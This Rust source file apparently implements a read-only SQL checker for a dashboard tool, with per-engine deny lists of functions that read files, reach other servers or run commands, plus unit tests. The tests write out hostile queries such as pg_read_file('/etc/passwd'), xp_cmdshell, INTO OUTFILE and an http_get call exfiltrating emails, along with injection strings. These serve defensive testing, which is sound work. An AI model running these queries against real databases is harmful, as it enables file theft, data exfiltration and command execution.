    "pg_try_advisory",
    "pg_create_",
    "pg_drop_",
    "pg_copy_",
    "pg_logical_slot_",
    "pg_replication_origin",
    "pg_backup_",
    "pg_wal_replay_",
    "lo_",
    "dblink",
    // pgsql-http, also functions it may add later.
    "http_",
];

/// ClickHouse functions (in lower case) that read files, reach other servers or run programs.
/// `readonly=1` refuses most of them already (they need temporary tables); this is the second
/// line, and keeps the refusal readable.
const CLICKHOUSE_FORBIDDEN_FUNCTIONS: &[&str] = &[
    "file",
    "filecluster",
    "url",
    "urlcluster",
    "s3",
    "s3cluster",
    "gcs",
    "azureblobstorage",
    "azureblobstoragecluster",
    "hdfs",
    "hdfscluster",
    "remote",
    "remotesecure",
    "cluster",
    "clusterallreplicas",
    "mysql",
    "postgresql",
    "mongodb",
    "redis",
    "sqlite",
    "jdbc",
    "odbc",
    "executable",
    "executablepool",
    "input",
    "deltalake",
    "deltalakecluster",
    "deltalakeazure",
    "deltalakelocal",
    "deltalakes3",
    "hudi",
    "hudicluster",
    "iceberg",
    "icebergs3",
    "icebergazure",
    "iceberghdfs",
    "iceberglocal",
    "icebergcluster",
    "icebergs3cluster",
    "icebergazurecluster",
    "iceberghdfscluster",
    "oss",
    "cosn",
    "s3queue",
    "azurequeue",
    "paimon",
    "ytsaurus",
    "arrowflight",
    "kafka",
];

/// Oracle packages, types and functions (lower case) that reach the network or files, run SQL
/// or code given as text, keep state outside the query or act on other sessions. Matched on
/// every part of a name. The read-only transaction and a read-only login stay the boundary.
const ORACLE_FORBIDDEN: &[&str] = &[
    "utl_http",
    "utl_tcp",
    "utl_smtp",
    "utl_mail",
    "utl_inaddr",
    "utl_file",
    "utl_url",
    "dbms_ldap",
    "dbms_network_acl_admin",
    "dbms_cloud",
    "dbms_xmlgen",
    "dbms_xmlquery",
    "dbms_xmlstore",
    "dbms_xslprocessor",
    "dbms_sql",
    "dbms_java",
    "dbms_scheduler",
    "dbms_job",
    "dbms_lock",
    "dbms_pipe",
    "dbms_alert",
    "dbms_aq",
    "dbms_aqadm",
    "dbms_session",
    "dbms_system",
    "dbms_backup_restore",
    "dbms_advisor",
    "httpuritype",
    "dburitype",
    "xdburitype",
    "uritype",
    "bfilename",
    "sys_xmlgen",
];

/// BigQuery functions (in lower case) that query other servers (federated queries) or call
/// remote models.
const BIGQUERY_FORBIDDEN_FUNCTIONS: &[&str] = &[
    "external_query",
    "generate_text",
    "generate_embedding",
    "generate_table",
    "generate",
    "generate_bool",
    "generate_double",
    "generate_int",
    "understand_text",
    "transcribe",
    "process_document",
    "annotate_image",
];

/// Snowflake functions (in lower case) that read files on stages or hand out links to them.
/// `SYSTEM$...` functions are refused by their `$` (`sql.dollar_in_name`).
const SNOWFLAKE_FORBIDDEN_FUNCTIONS: &[&str] = &[
    "get_presigned_url",
    "build_scoped_file_url",
    "build_stage_file_url",
    "get_stage_location",
    "infer_schema",
    "generate_column_description",
    // Cortex (SNOWFLAKE.CORTEX.*), which calls AI models. TRANSLATE is also an ordinary string
    // function, so it is refused only where it is a Cortex name (`snowflake_function_refused`).
    "complete",
    "try_complete",
    "summarize",
    "sentiment",
    "extract_answer",
    "classify_text",
    "embed_text_768",
    "embed_text_1024",
    "parse_document",
    "count_tokens",
    "finetune",
    "summarize_agg",
    "entity_sentiment",
];

/// Whether a Snowflake function name is refused beyond the list: any part with a `$` (the
/// `SYSTEM$` functions, also in double quotes, where the scanner does not see the `$`), any
/// function in the `CORTEX` schema, and every `AI_` function.
fn snowflake_function_refused(name: &ObjectName) -> bool {
    let parts: Vec<String> = name
        .0
        .iter()
        .map(|p| match p {
            ObjectNamePart::Identifier(ident) => ident.value.to_ascii_lowercase(),
            ObjectNamePart::Function(f) => f.name.value.to_ascii_lowercase(),
        })
        .collect();
    let last = parts.last().map(String::as_str).unwrap_or("");
    parts.iter().any(|p| p.contains('$') || p.starts_with("system$"))
        || parts.iter().rev().skip(1).any(|p| p == "cortex")
        || last.starts_with("ai_")
}

/// Databricks functions (in lower case) that read files and streams, send HTTP requests, read
/// secrets or call model endpoints. `ai_` functions are refused by prefix.
const DATABRICKS_FORBIDDEN_FUNCTIONS: &[&str] = &[
    "read_files",
    "read_kafka",
    "read_kinesis",
    "read_pubsub",
    "read_pulsar",
    "read_statestore",
    "cloud_files_state",
    "http_request",
    "secret",
    "try_secret",
    "list_secrets",
    "remote_query",
    "vector_search",
    // Calls Java methods on the warehouse (Spark's reflection functions).
    "java_method",
    "reflect",
    "try_reflect",
];

/// Databricks reads files when a table is named by a format and a path, as in
/// ``parquet.`/data/x` ``.
const DATABRICKS_FILE_FORMATS: &[&str] =
    &["parquet", "delta", "json", "csv", "text", "orc", "avro", "binaryfile", "xml", "file", "tsv"];

fn engine_forbids(engine: Engine, n: &str) -> bool {
    match engine {
        Engine::ClickHouse => CLICKHOUSE_FORBIDDEN_FUNCTIONS.contains(&n),
        Engine::BigQuery => BIGQUERY_FORBIDDEN_FUNCTIONS.contains(&n),
        Engine::Snowflake => SNOWFLAKE_FORBIDDEN_FUNCTIONS.contains(&n),
        Engine::Databricks => DATABRICKS_FORBIDDEN_FUNCTIONS.contains(&n) || n.starts_with("ai_"),
        _ => false,
    }
}

/// Refuses a forbidden function, by name. Only function calls are checked (a table called `edit`
/// is fine), and the PostgreSQL prefix families only on PostgreSQL.
fn forbidden(name: &ObjectName, engine: Engine) -> ControlFlow<Rejected> {
    let by_prefix = |n: &str| engine == Engine::Postgres && FORBIDDEN_PREFIXES.iter().any(|p| n.starts_with(p));
    // Oracle's packages are named by any part (`SYS.UTL_HTTP.REQUEST`), not the last.
    if engine == Engine::Oracle {
        let parts = name.0.iter().map(|p| match p {
            ObjectNamePart::Identifier(ident) => ident.value.to_ascii_lowercase(),
            ObjectNamePart::Function(f) => f.name.value.to_ascii_lowercase(),
        });
        for part in parts {
            if ORACLE_FORBIDDEN.contains(&part.as_str()) {
                let message = format!("{part} is not allowed: it reaches files, other servers or runs SQL as text");
                return ControlFlow::Break(Rejected::new("sql.function_not_allowed", message).with("name", part));
            }
        }
    }
    if engine == Engine::Snowflake && snowflake_function_refused(name) {
        let n = name.to_string();
        let message = format!("{n} is not allowed: it acts on the account or calls AI models");
        return ControlFlow::Break(Rejected::new("sql.function_not_allowed", message).with("name", n));
    }
    match last_name_part(name) {
        Some(n) if FORBIDDEN_FUNCTIONS.contains(&n.as_str()) || by_prefix(&n) || engine_forbids(engine, &n) => {
            let message = format!("{n} is not allowed: it reaches files, other servers or other sessions");
            ControlFlow::Break(Rejected::new("sql.function_not_allowed", message).with("name", n))
        }
        _ => ControlFlow::Continue(()),
    }
}

impl Visitor for ReadOnlyCheck {
    type Break = Rejected;

    fn pre_visit_statement(&mut self, statement: &Statement) -> ControlFlow<Rejected> {
        // Also reached for statements nested in a query, such as `WITH d AS (DELETE ...)`.
        if matches!(statement, Statement::Query(_)) {
            ControlFlow::Continue(())
        } else {
            ControlFlow::Break(Rejected::new("sql.not_select", "only SELECT and WITH queries are allowed"))
        }
    }

    fn pre_visit_query(&mut self, query: &Query) -> ControlFlow<Rejected> {
        if !query.locks.is_empty() {
            return ControlFlow::Break(Rejected::new(
                "sql.locking_clause",
                "locking clauses (FOR UPDATE, FOR SHARE) are not allowed",
            ));
        }
        if matches!(*query.body, SetExpr::Insert(_) | SetExpr::Update(_) | SetExpr::Delete(_) | SetExpr::Merge(_)) {
            return ControlFlow::Break(Rejected::new("sql.not_select", "only SELECT and WITH queries are allowed"));
        }
        // ClickHouse: `SETTINGS` would change the limits Kalzit sets, `FORMAT` the answer Kalzit
        // reads.
        if query.settings.is_some() {
            return ControlFlow::Break(Rejected::new("sql.settings_clause", "SETTINGS clauses are not allowed"));
        }
        if query.format_clause.is_some() {
            return ControlFlow::Break(Rejected::new(
                "sql.format_clause",
                "FORMAT clauses are not allowed; Kalzit chooses the result format",
            ));
        }
        ControlFlow::Continue(())
    }

    fn pre_visit_select(&mut self, select: &Select) -> ControlFlow<Rejected> {
        if select.into.is_some() {
            return ControlFlow::Break(Rejected::new("sql.select_into", "SELECT ... INTO is not allowed"));
        }
        ControlFlow::Continue(())
    }

    fn pre_visit_table_factor(&mut self, factor: &TableFactor) -> ControlFlow<Rejected> {
        // `FROM LATERAL f(...)` and `FROM f(...)` are table factors, not expressions.
        if self.engine == Engine::MsSql {
            // `FROM t OPTION (TABLE HINT (t, TABLOCKX))` and `FROM t x (TABLOCKX)` parse as
            // aliases with a column list; T-SQL has no such column lists on tables, so a query
            // hint or an old-style table hint is behind them.
            if let Some(alias) = factor_alias(factor) {
                if alias.name.value.eq_ignore_ascii_case("option") && alias.name.quote_style.is_none() {
                    return ControlFlow::Break(Rejected::new(
                        "sql.query_hint",
                        "query hints (OPTION (...)) are not allowed",
                    ));
                }
                // A column list naming only harmless hints is the old form of `WITH (NOLOCK)`.
                let hinted = alias.columns.iter().any(|c| {
                    let name = c.name.value.to_ascii_lowercase();
                    c.data_type.is_some()
                        || (MSSQL_HINT_WORDS.contains(&name.as_str()) && !ALLOWED_MSSQL_HINTS.contains(&name.as_str()))
                });
                if hinted {
                    let message = format!(
                        "the table hints after {} are not allowed; write WITH (NOLOCK) instead",
                        alias.name.value
                    );
                    return ControlFlow::Break(
                        Rejected::new("sql.legacy_table_hint", message).with("alias", &alias.name.value),
                    );
                }
            }
        }
        if let TableFactor::Table { with_hints, args, .. } = factor
            && self.engine == Engine::MsSql
        {
            // Hints written `WITH (...)` and the old form `t (TABLOCKX)`, which parses like
            // table function arguments.
            let mut hints: Vec<String> = with_hints.iter().map(hint_name).collect();
            if let Some(args) = args {
                hints.extend(
                    args.args
                        .iter()
                        .map(|a| a.to_string().to_ascii_lowercase())
                        .filter(|a| MSSQL_HINT_WORDS.contains(&a.as_str())),
                );
            }
            if let Some(bad) = hints.iter().find(|h| !ALLOWED_MSSQL_HINTS.contains(&h.as_str())) {
                let message = format!(
                    "the table hint {bad} is not allowed; only NOLOCK, READUNCOMMITTED, INDEX, NOEXPAND and FORCESEEK are"
                );
                return ControlFlow::Break(Rejected::new("sql.table_hint", message).with("hint", bad));
            }
        }
        if let TableFactor::Table { name, .. } = factor
            && self.engine == Engine::Databricks
            && let [ObjectNamePart::Identifier(format), ObjectNamePart::Identifier(path)] = name.0.as_slice()
            && path.quote_style == Some('`')
            && DATABRICKS_FILE_FORMATS.contains(&format.value.to_ascii_lowercase().as_str())
        {
            let message = format!("{} reads files directly and is not allowed; query a table", name);
            return ControlFlow::Break(Rejected::new("sql.path_table", message).with("name", name));
        }
        // Table functions such as OPENROWSET(...) appear here, with arguments; plain table and
        // view names are not function calls and are not checked.
        match factor {
            TableFactor::Function { name, .. } => forbidden(name, self.engine),
            TableFactor::Table { name, args: Some(_), .. } => forbidden(name, self.engine),
            _ => ControlFlow::Continue(()),
        }
    }

    fn pre_visit_expr(&mut self, expr: &Expr) -> ControlFlow<Rejected> {
        match expr {
            Expr::Function(f) => forbidden(&f.name, self.engine),
            // The second line behind the token scan: `seq.NEXTVAL` parses as a compound identifier.
            Expr::CompoundIdentifier(parts)
                if self.engine == Engine::Oracle && parts.last().is_some_and(|p| oracle_sequence_word(&p.value)) =>
            {
                ControlFlow::Break(Rejected::new(
                    "sql.sequence",
                    "NEXTVAL and CURRVAL use a sequence and are not allowed",
                ))
            }
            _ => ControlFlow::Continue(()),
        }
    }
}

/// The interval between points: the requested one, or the time range divided by the points the
/// panel can show, rounded up to a familiar step.
pub fn interval_ms(range: TimeRange, requested: Option<u64>, max_data_points: Option<u32>) -> u64 {
    /// Steps people read at a glance, in milliseconds.
    const STEPS: &[u64] = &[
        1,
        2,
        5,
        10,
        20,
        50,
        100,
        200,
        500,
        1_000,
        2_000,
        5_000,
        10_000,
        15_000,
        30_000,
        60_000,
        120_000,
        300_000,
        600_000,
        900_000,
        1_800_000,
        3_600_000,
        7_200_000,
        10_800_000,
        21_600_000,
        43_200_000,
        86_400_000,
        604_800_000,
    ];
    const DEFAULT_POINTS: u64 = 1_000;
    if let Some(ms) = requested.filter(|ms| *ms > 0) {
        return ms;
    }
    let span = range.to.saturating_sub(range.from).max(0) as u64;
    let points = max_data_points.map_or(DEFAULT_POINTS, |p| u64::from(p.max(1)));
    let raw = span.div_ceil(points).max(1);
    STEPS.iter().copied().find(|s| *s >= raw).unwrap_or(raw)
}

/// `30s`, `5m`, `1h`, `250ms`: the interval as text for engines without an interval type.
pub fn format_interval(ms: i64) -> String {
    for (unit, size) in [("d", 86_400_000), ("h", 3_600_000), ("m", 60_000), ("s", 1_000)] {
        if ms >= size && ms % size == 0 {
            return format!("{}{unit}", ms / size);
        }
    }
    format!("{ms}ms")
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    const ALL: [Engine; 4] = [Engine::Postgres, Engine::MySql, Engine::Sqlite, Engine::MsSql];

    fn ctx(vars: &BTreeMap<String, Value>) -> Context<'_> {
        Context {
            range: TimeRange { from: 1_000, to: 61_000 },
            interval_ms: 30_000,
            variables: vars,
            identifiers: None,
            identifier_variables: None,
        }
    }

    fn rejected(sql: &str, engine: Engine) -> String {
        let vars = BTreeMap::new();
        match prepare(sql, engine, &ctx(&vars)) {
            Err(rejected) => rejected.message,
            Ok(p) => panic!("{engine:?} accepted {sql}: {p:?}"),
        }
    }

    fn accepted(sql: &str, engine: Engine) -> Prepared {
        let vars = BTreeMap::from([("land".to_string(), json!("Österreich")), ("ids".to_string(), json!([1, 2, 3]))]);
        prepare(sql, engine, &ctx(&vars)).unwrap_or_else(|e| panic!("{engine:?} rejected {sql}: {e}"))
    }

    #[test]
    fn plain_selects_pass_unchanged() {
        for engine in ALL {
            let p = accepted("SELECT name, COUNT(*) FROM kunden GROUP BY name", engine);
            assert_eq!(p.sql, "SELECT name, COUNT(*) FROM kunden GROUP BY name");
            assert!(p.binds.is_empty());
            accepted("WITH t AS (SELECT 1 AS x) SELECT x FROM t", engine);
            accepted("SELECT 1;", engine);
        }
    }

    #[test]
    fn macros_become_bind_parameters() {
        let p = accepted("SELECT * FROM m WHERE $__timeFilter(ts) AND bucket = $__interval_ms", Engine::Postgres);
        assert_eq!(p.sql, "SELECT * FROM m WHERE (ts BETWEEN $1 AND $2) AND bucket = $3");
        assert_eq!(p.binds, [Bind::Time(1_000), Bind::Time(61_000), Bind::Int(30_000)]);

        let p = accepted("SELECT * FROM m WHERE ts >= $__timeFrom() AND ts < $__timeTo", Engine::MsSql);
        assert_eq!(p.sql, "SELECT * FROM m WHERE ts >= @P1 AND ts < @P2");

        let p = accepted("SELECT date_bin($__interval, ts, $__timeFrom) FROM m", Engine::Postgres);
        assert_eq!(p.binds, [Bind::Interval(30_000), Bind::Time(1_000)]);

        let p = accepted("SELECT * FROM m WHERE $__timeFilter(`Zeit punkt`)", Engine::MySql);
        assert_eq!(p.sql, "SELECT * FROM m WHERE (`Zeit punkt` BETWEEN ? AND ?)");
    }

    #[test]
    fn variables_are_bound_never_spliced() {
        let p = accepted("SELECT * FROM k WHERE land = $land AND id IN (${ids})", Engine::Sqlite);
        assert_eq!(p.sql, "SELECT * FROM k WHERE land = ? AND id IN (?, ?, ?)");
        assert_eq!(p.binds[0], Bind::Text("Österreich".into()));
        assert_eq!(p.binds[1..], [Bind::Int(1), Bind::Int(2), Bind::Int(3)]);

        // A value that looks like SQL stays a value.
        let vars = BTreeMap::from([("x".to_string(), json!("1; DROP TABLE k; --"))]);
        let p = prepare("SELECT * FROM k WHERE a = $x", Engine::Postgres, &ctx(&vars)).unwrap();
        assert_eq!(p.sql, "SELECT * FROM k WHERE a = $1");
        assert_eq!(p.binds, [Bind::Text("1; DROP TABLE k; --".into())]);

        assert!(rejected("SELECT $fehlt", Engine::Postgres).contains("no value"));
        let vars = BTreeMap::from([("o".to_string(), json!({ "a": 1 }))]);
        assert!(prepare("SELECT $o", Engine::Postgres, &ctx(&vars)).is_err());
        let vars = BTreeMap::from([("leer".to_string(), json!([]))]);
        let p = prepare("SELECT * FROM k WHERE id IN ($leer)", Engine::MySql, &ctx(&vars)).unwrap();
        assert_eq!(p.binds, [Bind::Null]);
    }

    #[test]
    fn substitutions_skip_strings_comments_and_quoted_names() {
        for (sql, engine) in [
            ("SELECT '$land' AS a", Engine::Postgres),
            ("SELECT 'it''s $land' AS a", Engine::Sqlite),
            ("SELECT \"$land\" FROM t", Engine::Postgres),
            ("SELECT 1 -- $land\n", Engine::MySql),
            ("SELECT 1 # $land\n", Engine::MySql),
            ("SELECT 1 /* $land /* nested */ $land */", Engine::Postgres),
            ("SELECT $tag$ $land $tag$", Engine::Postgres),
            ("SELECT $$ $land $$", Engine::Postgres),
            ("SELECT [$land] FROM t", Engine::MsSql),
            ("SELECT 'a\\' $land' AS a", Engine::MySql),
            ("SELECT E'a\\' $land' AS a", Engine::Postgres),
        ] {
            let p = accepted(sql, engine);
            assert!(p.binds.is_empty(), "{engine:?} {sql}: {p:?}");
            assert_eq!(p.sql, sql);
        }
        // Outside the string the variable is replaced; umlauts around it stay intact.
        let p = accepted("SELECT 'Grüße' AS gruß, $land AS ländle", Engine::Postgres);
        assert_eq!(p.sql, "SELECT 'Grüße' AS gruß, $1 AS ländle");
    }

    #[test]
    fn backslash_escapes_cannot_hide_a_second_statement() {
        // MySQL (with the sql_mode mysql.rs pins) and ClickHouse read \' inside a string as a
        // quote: the string goes on, so the semicolon and the DROP are text in it.
        let hidden = r"SELECT 'x\'; DROP TABLE y; --' AS a";
        // \\ is one backslash: the string ends there, and what follows is a second statement.
        let ended = r"SELECT 'x\\'; DROP TABLE y";
        let written = r"SELECT 'x\\' AS a; DELETE FROM y";
        for engine in [Engine::MySql, Engine::ClickHouse] {
            let p = accepted(hidden, engine);
            assert_eq!(p.sql, hidden, "{engine:?}");
            for sql in [ended, written] {
                let reason = prepare(sql, engine, &ctx(&BTreeMap::new())).expect_err(sql).reason;
                assert_eq!(reason, "sql.multiple_statements", "{engine:?} {sql}");
            }
            // The checker's parser and the scanner end the string at the same place.
            let p = accepted(r"SELECT 'a\'b' AS a, 'c' AS c", engine);
            assert!(p.binds.is_empty(), "{engine:?}");
        }
        // Engines without backslash escapes end the string at the quote after the backslash, so
        // the same text is two statements there and refused.
        for engine in [Engine::Postgres, Engine::Sqlite, Engine::MsSql] {
            let reason = prepare(hidden, engine, &ctx(&BTreeMap::new())).expect_err(hidden).reason;
            assert!(["sql.multiple_statements", "sql.parse_error"].contains(&reason), "{engine:?}: {reason}");
        }
    }

    #[test]
    fn identifier_variables_need_the_schema_allow_list() {
        let vars = BTreeMap::from([
            ("tabelle".to_string(), json!("public.bestellungen")),
            ("böse".to_string(), json!("x")),
            ("spalten".to_string(), json!(["menge", "preis"])),
            ("fremd".to_string(), json!("pg_shadow")),
        ]);
        let allowed: BTreeSet<String> =
            ["public.bestellungen", "bestellungen", "menge", "preis"].iter().map(|s| s.to_string()).collect();
        let mut c = ctx(&vars);
        c.identifiers = Some(&allowed);
        let sql = "SELECT ${spalten:identifier} FROM ${tabelle:identifier}";
        assert!(uses_identifier_variables(sql, Engine::Postgres));
        let p = prepare(sql, Engine::Postgres, &c).unwrap();
        assert_eq!(p.sql, "SELECT \"menge\", \"preis\" FROM \"public\".\"bestellungen\"");
        assert!(p.binds.is_empty());
        let p = prepare(sql, Engine::MsSql, &c).unwrap();
        assert_eq!(p.sql, "SELECT [menge], [preis] FROM [public].[bestellungen]");
        let e = prepare("SELECT * FROM ${fremd:identifier}", Engine::Postgres, &c).unwrap_err();
        assert!(e.message.contains("not a table or column"), "{e}");
        assert!(prepare("SELECT * FROM ${tabelle:raw}", Engine::Postgres, &c).is_err());
        assert!(!uses_identifier_variables("SELECT $tabelle", Engine::Postgres));
        let mut no_schema = ctx(&vars);
        no_schema.identifiers = None;
        assert!(prepare(sql, Engine::Postgres, &no_schema).is_err());
    }

    #[test]
    fn hand_written_placeholders_are_refused() {
        assert!(rejected("SELECT * FROM t WHERE a = $1", Engine::Postgres).contains("placeholders"));
        assert!(rejected("SELECT * FROM t WHERE a = ?", Engine::MySql).contains("placeholders"));
        assert!(rejected("SELECT * FROM t WHERE a = :name", Engine::Sqlite).contains("placeholders"));
        assert!(rejected("SELECT * FROM t WHERE a = @P1", Engine::MsSql).contains("placeholders"));
        // The JSONB operator ? is not a placeholder in PostgreSQL.
        accepted("SELECT doc ? 'key' FROM t", Engine::Postgres);
        assert!(rejected("SELECT $__unbekannt", Engine::Postgres).contains("unknown macro"));
        assert!(rejected("SELECT * FROM t WHERE $__timeFilter(ts OR 1=1)", Engine::Postgres).contains("column"));
    }

    /// The statement check, per engine, for every rule in docs/ARCHITECTURE.md.
    #[test]
    fn writes_and_dangerous_functions_are_rejected_on_every_engine() {
        for engine in ALL {
            for sql in [
                "INSERT INTO t VALUES (1)",
                "UPDATE t SET a = 1",
                "DELETE FROM t",
                "DROP TABLE t",
                "CREATE TABLE x (a INT)",
                "SELECT 1; SELECT 2",
                "SELECT 1; DELETE FROM t",
                "",
            ] {
                rejected(sql, engine);
            }
        }
        let cases: &[(Engine, &[&str])] = &[
            (
                Engine::Postgres,
                &[
                    "SELECT * INTO neu FROM t",
                    "SELECT * FROM t FOR UPDATE",
                    "SELECT * FROM t FOR SHARE",
                    "WITH d AS (DELETE FROM t RETURNING *) SELECT * FROM d",
                    "WITH u AS (UPDATE t SET a = 1 RETURNING *) SELECT * FROM u",
                    "SELECT pg_read_file('/etc/passwd')",
                    "SELECT pg_catalog.pg_read_binary_file('/etc/passwd')",
                    "SELECT lo_import('/etc/passwd')",
                    "SELECT * FROM dblink('host=x', 'SELECT 1') AS t(a int)",
                    "SELECT content FROM http_get('http://example.org/?' || (SELECT string_agg(email, ',') FROM t))",
                    "SELECT status FROM extensions.http_post('http://example.org/', 'x', 'text/plain')",
                    "SELECT HTTP_PUT('http://example.org/', 'x', 'text/plain')",
                    "SELECT http(('GET', 'http://example.org/', NULL, NULL, NULL)::http_request)",
                    "SELECT * FROM http_head('http://example.org/')",
                    "SELECT http_delete('http://example.org/')",
                    "SELECT http_patch('http://example.org/', 'x', 'text/plain')",
                    "SELECT http_set_curlopt('CURLOPT_TIMEOUT', '1')",
                    "SELECT query_to_xml('SELECT pg_read_file(''/etc/passwd'')', true, true, '')",
                    "SELECT pg_terminate_backend(1)",
                    "SELECT set_config('x', 'y', false)",
                    "SELECT (SELECT PG_LS_DIR('.'))",
                    "SELECT * FROM pg_ls_replslotdir('slot')",
                    "SELECT pg_ls_logicalsnapdir()",
                    "SELECT pg_stat_statements_reset()",
                    "COPY t TO '/tmp/x'",
                    "SET search_path = x",
                    "DO $$ BEGIN END $$",
                ],
            ),
            (
                Engine::MySql,
                &[
                    "SELECT LOAD_FILE('/etc/passwd')",
                    "SELECT * FROM t INTO OUTFILE '/tmp/x'",
                    "SELECT * INTO OUTFILE '/tmp/x' FROM t",
                    "SELECT a INTO @v FROM t",
                    "SELECT * FROM t FOR UPDATE",
                    "SELECT * FROM t LOCK IN SHARE MODE",
                    "SELECT 1 /*!50000 INTO OUTFILE '/tmp/x' */",
                    "SELECT 1 /*M! INTO OUTFILE '/tmp/x' */",
                    "LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE t",
                    "SET GLOBAL local_infile = 1",
                ],
            ),
            (
                Engine::Sqlite,
                &[
                    "SELECT load_extension('/tmp/evil')",
                    "SELECT writefile('/tmp/x', 'y')",
                    "SELECT readfile('/etc/passwd')",
                    "ATTACH DATABASE '/tmp/x.db' AS x",
                    "PRAGMA writable_schema = ON",
                    "VACUUM INTO '/tmp/copy.db'",
                    "WITH d AS (SELECT 1) DELETE FROM t",
                ],
            ),
            (
                Engine::MsSql,
                &[
                    "SELECT * INTO neu FROM t",
                    "SELECT * FROM OPENROWSET('SQLNCLI', 'Server=x;', 'SELECT 1') AS r",
                    "SELECT * FROM OPENDATASOURCE('SQLNCLI', 'Data Source=x').db.dbo.t",
                    "SELECT * FROM OPENQUERY(linked, 'SELECT 1')",
                    "SELECT * FROM sys.fn_get_audit_file('C:\\x\\*', DEFAULT, DEFAULT)",
                    "SELECT * FROM sys.dm_os_enumerate_filesystem('C:\\', '*')",
                    "SELECT file_exists FROM sys.dm_os_file_exists('C:\\Windows\\win.ini')",
                    "EXEC xp_cmdshell 'dir'",
                    "WITH c AS (SELECT 1 AS a) DELETE FROM t",
                ],
            ),
        ];
        for (engine, sqls) in cases {
            for sql in *sqls {
                let reason = rejected(sql, *engine);
                assert!(!reason.is_empty(), "{engine:?} {sql}");
            }
        }
        assert!(rejected("SELECT LOAD_FILE('/etc/passwd')", Engine::MySql).contains("load_file"));
        assert!(rejected("SELECT * FROM t FOR UPDATE", Engine::Postgres).contains("locking"));
        assert!(rejected("SELECT * INTO neu FROM t", Engine::MsSql).contains("INTO"));
        assert!(rejected("SELECT 1 /*!50000 INTO OUTFILE '/x' */", Engine::MySql).contains("executable comments"));
    }

    /// MySQL reads `--` as a comment only before a space or control character; otherwise the
    /// text after it is SQL, and the checker must see it as SQL too.
    #[test]
    fn mysql_dash_comments_follow_the_server() {
        // Not a comment for MySQL: the rest is checked (and here refused).
        rejected("SELECT 1 --x\nUNION SELECT LOAD_FILE('/etc/passwd')", Engine::MySql);
        let p = accepted("SELECT 2 --1", Engine::MySql);
        assert_eq!(p.sql, "SELECT 2 --1");
        let p = accepted("SELECT 2 --$land", Engine::MySql);
        assert_eq!((p.sql.as_str(), p.binds.len()), ("SELECT 2 --?", 1));
        // A comment for MySQL: nothing in it is substituted.
        accepted("SELECT 1 -- $land\n", Engine::MySql);
        accepted("SELECT 1 --\t$land\n", Engine::MySql);
        // Where the parsers would disagree, the query is refused.
        assert!(rejected("SELECT 1 --\u{a0}x\n", Engine::MySql).contains("ordinary space"));
        // Executable comments are refused anywhere, also where a string or comment hides them.
        for sql in ["SELECT '/*!50000'", "SELECT 1 -- /*M! x */\n", "SELECT 1 /* /*m! */"] {
            assert!(rejected(sql, Engine::MySql).contains("executable"), "{sql}");
        }
        // Other engines read every `--` as a comment.
        accepted("SELECT 1 --$land", Engine::Postgres);
    }

    #[test]
    fn functions_in_from_are_checked_too() {
        for sql in [
            "SELECT * FROM LATERAL pg_read_file('/etc/passwd') AS f",
            "SELECT * FROM t, LATERAL pg_ls_dir('.') AS d",
            "SELECT * FROM pg_ls_dir('.') AS d",
        ] {
            assert!(rejected(sql, Engine::Postgres).contains("not allowed"), "{sql}");
        }
        assert!(rejected("SELECT GET_LOCK('x', 1)", Engine::MySql).contains("get_lock"));
        assert!(rejected("SELECT NEXT VALUE FOR dbo.s", Engine::MsSql).contains("sequence"));
        assert!(rejected("SELECT 1 WHERE 2 = (SELECT next  VALUE\n FOR s)", Engine::MsSql).contains("sequence"));
    }

    #[test]
    fn engine_syntax_passes() {
        accepted("SELECT DISTINCT ON (a) a, b::text, c->>'k' FROM t ORDER BY a LIMIT 5", Engine::Postgres);
        accepted("SELECT TOP 10 [Name], CAST(ts AS date) FROM dbo.t ORDER BY 1", Engine::MsSql);
        accepted("SELECT `a`, IFNULL(b, 0) FROM t LIMIT 5 OFFSET 2", Engine::MySql);
        accepted("SELECT * FROM pragma_table_info('t')", Engine::Sqlite);
        accepted("SELECT a FROM t UNION ALL SELECT b FROM u", Engine::Sqlite);
        accepted("SELECT ts, avg(v) FROM m WHERE $__timeFilter(ts) GROUP BY 1 ORDER BY 1", Engine::Postgres);
    }

    #[test]
    fn intervals_round_to_familiar_steps() {
        let hour = TimeRange { from: 0, to: 3_600_000 };
        assert_eq!(interval_ms(hour, None, Some(1_000)), 5_000);
        assert_eq!(interval_ms(hour, None, Some(60)), 60_000);
        assert_eq!(interval_ms(hour, Some(1_234), None), 1_234);
        assert_eq!(interval_ms(TimeRange { from: 10, to: 10 }, None, None), 1);
        assert_eq!(interval_ms(TimeRange { from: 10, to: 0 }, None, Some(0)), 1);
        assert_eq!(format_interval(30_000), "30s");
        assert_eq!(format_interval(300_000), "5m");
        assert_eq!(format_interval(7_200_000), "2h");
        assert_eq!(format_interval(86_400_000), "1d");
        assert_eq!(format_interval(250), "250ms");
    }

    #[test]
    fn postgres_unicode_escapes_are_refused() {
        for sql in [r#"SELECT U&"pg_read_fil\0065"('/etc/passwd')"#, r#"SELECT u&"x" FROM t"#, "SELECT U&'\\0041' AS a"]
        {
            assert!(rejected(sql, Engine::Postgres).contains("Unicode"), "{sql}");
        }
        // Inside a string or comment the letters mean nothing.
        accepted("SELECT 'U&\"x\"' AS a -- U&'y'\n", Engine::Postgres);
        accepted("SELECT menu & 3 FROM t", Engine::Postgres);
    }

    #[test]
    fn postgres_functions_with_side_effects_are_refused() {
        for f in [
            "pg_switch_wal()",
            "pg_create_restore_point('x')",
            "pg_stat_reset()",
            "pg_stat_reset_shared('bgwriter')",
            "pg_logical_slot_get_changes('s', NULL, NULL)",
            "pg_logical_slot_peek_changes('s', NULL, NULL)",
            "pg_create_logical_replication_slot('s', 'pgoutput')",
            "pg_drop_replication_slot('s')",
            "pg_replication_origin_create('o')",
            "pg_log_backend_memory_contexts(1)",
            "pg_backup_start('x')",
            "pg_backup_stop()",
            "pg_promote()",
            "pg_reload_conf()",
            "pg_rotate_logfile()",
            "set_config('a', 'b', false)",
            "pg_advisory_xact_lock(1)",
            "pg_advisory_unlock_all()",
            "pg_notify('c', 'p')",
            "nextval('s')",
            "setval('s', 1)",
        ] {
            let sql = format!("SELECT {f}");
            assert!(rejected(&sql, Engine::Postgres).contains("not allowed"), "{sql}");
        }
        accepted("SELECT pg_size_pretty(1024), lower('A')", Engine::Postgres);
    }

    #[test]
    fn sql_server_table_hints_are_limited_to_reads_without_locks() {
        accepted("SELECT a FROM t WITH (NOLOCK)", Engine::MsSql);
